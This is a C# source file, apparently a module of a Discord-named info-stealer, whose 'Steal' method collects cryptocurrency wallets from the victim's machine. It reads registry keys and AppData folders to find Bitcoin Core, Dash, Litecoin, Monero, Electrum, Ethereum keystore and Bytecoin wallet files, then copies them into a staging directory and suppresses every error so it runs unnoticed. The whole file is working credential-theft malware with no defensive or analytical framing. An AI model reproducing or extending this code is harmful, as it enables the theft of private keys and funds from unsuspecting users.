using System;
using System.IO;
using Microsoft.Win32;

//using System.Linq;

namespace Discord_New
{
    internal class Crypto
    {
        public static int count;

        public static void BCN(string directorypath) // Works
        {
            try
            {
                foreach (var file in new DirectoryInfo(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + "\\Bytecoin\\");
                    if (file.Extension.Equals(".wallet"))
                    {
                        file.CopyTo(directorypath + "\\Bytecoin\\" + file.Name);
                        count++;
                    }
                }
            }
            catch (Exception ex)
            {
                //  // //Console.WriteLine(ex.ToString());
            }
        }

        public static void BitcoinCore(string directorypath) // Works
        {
            try
            {
                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin")
                    .OpenSubKey("Bitcoin-Qt"))
                {
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\BitcoinCore\\");
                        File.Copy(registryKey.GetValue("strDataDir") + "\\wallet.dat",
                            directorypath + "\\BitcoinCore\\wallet.dat");
                        count++;
                    }
                    catch (Exception ex)
                    {
                        //  // //Console.WriteLine(ex.ToString());
                    }
                }
            }
            catch (Exception ex)
            {
                // // //Console.WriteLine(ex.ToString());
            }
        }

        public static void DSH(string directorypath) // Works
        {
            try
            {
                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash")
                    .OpenSubKey("Dash-Qt"))
                {
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\DashCore\\");
                        File.Copy(registryKey.GetValue("strDataDir") + "\\wallet.dat",
                            directorypath + "\\DashCore\\wallet.dat");
                        count++;
                    }
                    catch (Exception ex)
                    {
                        //  // //Console.WriteLine(ex.ToString());
                    }
                }
            }
            catch (Exception ex)
            {
                //  // //Console.WriteLine(ex.ToString());
            }
        }

        public static void Electrum(string directorypath) // Works
        {
            try
            {
                foreach (var file in new DirectoryInfo(
                        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets")
                    .GetFiles())
                {
                    Directory.CreateDirectory(directorypath + "\\Electrum\\");
                    file.CopyTo(directorypath + "\\Electrum\\" + file.Name);
                    count++;
                }
            }
            catch (Exception ex)
            {
                //  // //Console.WriteLine(ex.ToString());
            }
        }

        public static void ETH(string directorypath) // Works
        {
            try
            {
                foreach (var file in new DirectoryInfo(
                        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\keystore")
                    .GetFiles())
                {
                    Directory.CreateDirectory(directorypath + "\\Ethereum\\");
                    file.CopyTo(directorypath + "\\Ethereum\\" + file.Name);
                    count++;
                }
            }
            catch (Exception ex)
            {
                //  // //Console.WriteLine(ex.ToString());
            }
        }

        public static void LTC(string directorypath) // Works
        {
            try
            {
                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin")
                    .OpenSubKey("Litecoin-Qt"))
                {
                    try
                    {
                        //  // //Console.WriteLine(registryKey.GetValue("strDataDir").ToString());
                        Directory.CreateDirectory(directorypath + "\\LitecoinCore\\");
                        File.Copy(registryKey.GetValue("strDataDir") + "\\wallet.dat",
                            directorypath + "\\LitecoinCore\\wallet.dat");
                        count++;
                    }
                    catch (Exception ex)
                    {
                        //  // //Console.WriteLine(ex.ToString());
                    }
                }
            }
            catch (Exception ex)
            {
                // // //Console.WriteLine(ex.ToString());
            }
        }

        public static int Steal(string cryptoDir)
        {
            BCN(cryptoDir);
            BitcoinCore(cryptoDir);
            DSH(cryptoDir);
            Electrum(cryptoDir);
            ETH(cryptoDir);
            LTC(cryptoDir);
            XMR(cryptoDir);
            ZEC(cryptoDir);
            return count;
        }

        public static void XMR(string directorypath) // Works
        {
            try
            {
                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project")
                    .OpenSubKey("monero-core"))
                {
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\Monero\\");
                        var dir = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
                        Directory.CreateDirectory(directorypath + "\\Monero\\");
                        File.Copy(dir, directorypath + "\\Monero\\" + dir.Split('\\')[dir.Split('\\').Length - 1]);
                        count++;
                    }
                    catch (Exception ex)
                    {
                        // //Console.WriteLine(ex.ToString());
                    }
                }
            }
            catch (Exception ex)
            {
                //  // //Console.WriteLine(ex.ToString());
            }
        }

        public static void ZEC(string directorypath)
        {
        }
    }
}